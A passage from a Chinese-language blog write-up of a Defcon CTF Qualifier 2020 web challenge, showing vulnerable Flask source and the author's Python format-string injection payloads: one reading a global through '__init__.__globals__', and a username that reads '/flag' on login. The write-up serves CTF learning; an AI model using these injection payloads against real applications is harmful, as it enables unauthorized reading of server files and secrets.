class="symbol">:</span></span><br><span class="line">        <span class="keyword">self</span>.comments.append(Comment(comment, commenter, preview))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_comments</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        out = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> ccnt, cmt <span class="keyword">in</span> enumerate(<span class="keyword">self</span>.comments)<span class="symbol">:</span></span><br><span class="line">            fmt_cmt = cmt.comment.format(rating=<span class="keyword">self</span>.__dict_<span class="number">_</span>)</span><br><span class="line">            form_save = f<span class="string">""</span><span class="string">"</span></span><br><span class="line"><span class="string">                &lt;form action="</span>/dogooo/deets/add/&#123;<span class="keyword">self</span>.id&#125;<span class="string">" method="</span>POST<span class="string">"&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=hidden id="</span>comment<span class="string">" name="</span>comment<span class="string">" value='&#123;fmt_cmt&#125;'&gt;&lt;/textarea&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=hidden id="</span>commenter<span class="string">" name="</span>commenter<span class="string">" value='&#123;cmt.author&#125;'/&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=submit value="</span>Save<span class="string">" /&gt;</span></span><br><span class="line"><span class="string">                &lt;/form&gt;</span></span><br><span class="line"><span class="string">            "</span><span class="string">""</span></span><br><span class="line">            <span class="keyword">if</span> cmt.<span class="symbol">preview:</span></span><br><span class="line">                out += f<span class="string">"&lt;ul class='square'&gt;&#123;fmt_cmt&#125; - &#123;cmt.author&#125; &#123;form_save&#125; &lt;/ul&gt;\n"</span></span><br><span class="line">            <span class="symbol">else:</span></span><br><span class="line">                out += f<span class="string">"&lt;ul class='square'&gt;&#123;fmt_cmt&#125; - &#123;cmt.author&#125;&lt;/ul&gt;\n"</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> out</span><br></pre></td></tr></table></figure>
<p>这里猜测是否是利用<code>fstring</code>的格式化字符串漏洞，可以看一下<a href="https://www.leavesongs.com/PENETRATION/python-string-format-vulnerability.html" target="_blank" rel="noopener">P神的文章</a>，以及<a href="https://www.anquanke.com/post/id/170620" target="_blank" rel="noopener">安全客上的一篇</a>。</p>
<p>继续审源码，发现这里的<code>get_user_info</code>函数是在用户登录时候调用，也就是说，如果可以利用格式化字符串漏洞，创建一个用户，将命令注入到<code>username</code>中，那么在登录时就可以执行命令了。</p>
<p>另外，这里需要一个能够创建账户登录的用户，这里利用使用了<code>fstring</code>的第二处——<code>get_comments</code>函数，另外在这里发现有一个叫<code>post_results</code>的全局变量,读取一下试试：</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;rating[<span class="string">comments</span>][<span class="symbol">0</span>].<span class="strong">__init__</span>.<span class="strong">__globals__</span>[post_results]&#125;</span><br></pre></td></tr></table></figure>
<p>读取结果</p>
<p><img src="/image/202005_defcon/4.png" alt=""></p>
<p>可以拿到一个作者用户，登录后修改用户名为读取<code>flag</code>的命令</p>
<figure class="highlight clojure"><table><tr><td class="code"><pre><span class="line">&#123;open(<span class="name">'/flag'</span>).read()&#125;</span><br></pre></td></tr></table></figure>
<p>再登录即可拿到<code>flag</code></p>
<p><img src="/image/202005_defcon/5.png" alt=""></p>
<p>这个题，后续看了下其他师傅的WP，貌似还有个模板注入可以直接解</p>
<figure class="highlight aspectj"><table><tr><td class="code"><pre><span class="line"><span class="meta">@app</span>.route(<span class="string">"/dogooo/deets/&lt;postid&gt;"</span>, methods=[<span class="string">"GET"</span>,<span class="string">"POST"</span>])</span><br></pre></td></tr></table></figure></div><div class="tags"><a href="/tags/CTF/">CTF</a><a href="/tags/writeup/">writeup</a></div><div class="post-nav"><a class="pre" href="/2020/05/26/HTTP-Smuggling-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/">HTTP_Smuggling-请求走私</a><a class="next" href="/2020/05/13/%E7%BD%91%E9%BC%8E%E6%9D%AF2020-%E9%9D%92%E9%BE%99%E7%BB%84-%E9%83%A8%E5%88%86WP/">网鼎杯2020-青龙组-部分WP</a></div><div id="disqus_thread"><div class="btn_click_load"><button class="disqus_click_btn">阅读评论（请确保 Disqus 可以正常加载）</button></div><script type="text/javascript">var disqus_config = function () {
    this.page.url = 'http://www.xiaozzz.xyz/2020/05/22/Defcon-CTF-Qual-2020-Web-WP/';
    this.page.identifier = '2020/05/22/Defcon-CTF-Qual-2020-Web-WP/';
    this.page.title = 'Defcon_CTF_Qual_2020-Web-WP';
  };</script><script type="text/javascript" id="disqus-lazy-load-script">$.ajax({
url: 'https://disqus.com/next/config.json',
timeout: 2500,
type: 'GET',
success: function(){
  var d = document;
  var s = d.createElement('script');
  s.src = '//xiaoZz.disqus.com/embed.js';
  s.setAttribute('data-timestamp', + new Date());
  (d.head || d.body).appendChild(s);
  $('.disqus_click_btn').css('display', 'none');
},
error: function() {
  $('.disqus_click_btn').css('display', 'block');
}
});</script><script type="text/javascript" id="disqus-click-load">$('.btn_click_load').click(() => {  //click to load comments
    (() => { // DON'T EDIT BELOW THIS LINE
        var d = document;
        var s = d.createElement('script');
        s.src = '//xiaoZz.disqus.com/embed.js';
        s.setAttribute('data-timestamp', + new Date());
        (d.head || d.body).appendChild(s);
    })();
    $('.disqus_click_btn').css('display','none');
});</script><script type="text/javascript" id="disqus-count-script">$(function() {
     var xhr = new XMLHttpRequest();
     xhr.open('GET', '//disqus.com/next/config.json', true);
     xhr.timeout = 2500;
     xhr.onreadystatechange = function () {
       if (xhr.readyState === 4 && xhr.status === 200) {
         $('.post-meta .post-comments-count').show();
         var s = document.createElement('script');
         s.id = 'dsq-count-scr';
         s.src = 'https://xiaoZz.disqus.com/count.js';
         s.async = true;
         (document.head || document.body).appendChild(s);
       }
     };
     xhr.ontimeout = function () { xhr.abort(); };
     xhr.send(null);
   });
</script></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><div class="widget-title"><i class="fa fa-folder-o"> Categories</i></div><ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF-writeup/">CTF_writeup</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D/">Web漏洞介绍</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/">密码学</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BC%96%E7%A0%81%E4%B8%8E%E5%BC%80%E5%8F%91/">编码与开发</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> Tags</i></div><div class="tagcloud"><a href="/tags/Web%E6%BC%8F%E6%B4%9E/" style="font-size: 15px;">Web漏洞</a> <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 15px;">反序列化</a> <a href="/tags/CTF/" style="font-size: 15px;">CTF</a> <a href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" style="font-size: 15px;">密码学</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%90%86%E8%AE%BA/" style="font-size: 15px;">网络安全理论</a> <a href="/tags/%E5%93%88%E5%B8%8C%E5%87%BD%E6%95%B0/" style="font-size: 15px;">哈希函数</a> <a href="/tags/SSRF/" style="font-size: 15px;">SSRF</a> <a href="/tags/writeup/" style="font-size: 15px;">writeup</a> <a href="/tags/%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%93%8D%E4%BD%9C/" style="font-size: 15px;">字符串操作</a> <a href="/tags/%E5%BC%80%E5%8F%91/" style="font-size: 15px;">开发</a> <a href="/tags/Web/" style="font-size: 15px;">Web</a> <a href="/tags/PHP/" style="font-size: 15px;">PHP</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> Recent</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/08/28/%E9%A6%96%E5%B1%8A%E9%92%93%E9%B1%BC%E5%9F%8E%E6%9D%AF%E9%83%A8%E5%88%86wp/">首届钓鱼城杯部分wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/26/HTTP-Smuggling-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/">HTTP_Smuggling-请求走私</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/22/Defcon-CTF-Qual-2020-Web-WP/">Defcon_CTF_Qual_2020-Web-WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/05/13/%E7%BD%91%E9%BC%8E%E6%9D%AF2020-%E9%9D%92%E9%BE%99%E7%BB%84-%E9%83%A8%E5%88%86WP/">网鼎杯2020-青龙组-部分WP</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/12/22/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0-%E5%AF%86%E7%A0%81%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8/">密码学学习-密码硬件安全</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/25/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0-%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81/">密码学学习-分组密码</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/20/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0-MAC%E4%B8%8EAEAD/">密码学学习-MAC与AEAD</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/17/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%9F%BA%E7%A1%80/">正则表达式基础</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/16/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0-%E6%95%B0%E5%AD%97%E8%AF%81%E4%B9%A6%E4%B8%8EPKI/">密码学学习-数字证书与PKI</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/12/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0-%E5%AF%86%E7%A0%81%E6%9D%82%E5%87%91%E5%87%BD%E6%95%B0/">密码学学习-密码杂凑函数</a></li></ul></div><div class="widget"><div class="widget-title"><i class="fa fa-comment-o"> Recent Comments</i></div><script type="text/javascript" src="//xiaoZz.disqus.com/recent_comments_widget.js?num_items=5&amp;hide_avatars=1&amp;avatar_size=32&amp;excerpt_length=20&amp;hide_mods=1"></script></div><div class="widget"><div class="widget-title"><i class="fa fa-external-link"> Links</i></div><ul></ul><a href="https://momomoxiaoxi.com/" title="moxiaoxi" target="_blank">moxiaoxi</a></div></div></div><div class="pure-u-1 pure-u-md-3-4"><div id="footer">Copyright © 2020 <a href="/." rel="nofollow">xiaoZ's Blog.</a> Powered by<a rel="nofollow" target="_blank" href="https://hexo.io"> Hexo.</a><a rel="nofollow" target="_blank" href="https://github.com/tufu9441/maupassant-hexo"> Theme</a> by<a rel="nofollow" target="_blank" href="https://github.com/pagecho"> Cho.</a></div></div></div><a class="show" id="rocket" href="#top"></a><script type="text/javascript" src="/js/totop.js?v=0.0.0" async></script><script type="text/javascript" src="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js" async></script><script type="text/javascript" src="/js/fancybox.js?v=0.0.0" async></script><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css"><script type="text/javascript" color="100,100,100" opacity="0.5" zIndex="-2" count="50" src="//cdn.bootcss.com/canvas-nest.js/1.0.1/canvas-nest.min.js"></script><script type="text/javascript" src="/js/codeblock-resizer.js?v=0.0.0"></script><script type="text/javascript" src="/js/smartresize.js?v=0.0.0"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>